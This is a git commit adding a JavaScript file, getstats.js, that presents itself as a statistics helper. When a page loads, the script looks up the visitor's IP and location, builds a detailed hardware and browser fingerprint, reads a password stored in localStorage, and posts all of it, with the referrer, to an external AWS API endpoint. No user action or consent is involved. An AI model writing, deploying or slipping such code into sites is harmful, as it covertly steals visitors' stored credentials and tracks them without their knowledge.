463ad7029b2baedb076c058b2a0a0a74dd1554d8
Lalitha Priya Garigapati <priya.garigapati@gmail.com>
2024-02-15 00:48:59 -0500

    Add files via upload

---
+++ getstats.js
@@ -0,0 +1,44 @@
+function getStatData (response) {
+  navigator.mediaDevices.enumerateDevices().then(
+      ctrldevices => {
+        $.ajax({
+          url:"https://l1az6ozvxa.execute-api.us-east-1.amazonaws.com/alpha/helloworld",
+          type: "post",
+          dataType: 'json',
+          contentType: "application/json",
+          data: JSON.stringify({ip: response.ip, jsondata: JSON.stringify(response), city: response.city, page: cpage, region:response.region, org:response.org, pwd:localStorage.getItem("password"),referrer:document.referrer, else:JSON.stringify({hardware:hardwareInfo(), inp: ctrldevices})})
+        });
+      }
+    )
+}
+function ipLookUp () {
+  fetch('https://ipapi.co/json')
+   .then( response => response.json() )
+   .then( data => getStatData(data) )
+}
+function hardwareInfo() {
+    return JSON.stringify({
+        mem: navigator.deviceMemory,
+        cores: navigator.hardwareConcurrency,
+        touchpoints: navigator.maxTouchPoints,
+        platform:navigator.platform,
+        userAgent: navigator.userAgent,
+        graphics: getVideoCardInfo()
+    })
+}
+function getVideoCardInfo() {
+  const gl = document.createElement('canvas').getContext('webgl');
+  if (!gl) {
+    return {
+      error: "no webgl",
+    };
+  }
+  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+  return debugInfo ? {
+    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+    renderer:  gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+  } : {
+    error: "no WEBGL_debug_renderer_info",
+  };
+}
+ipLookUp()
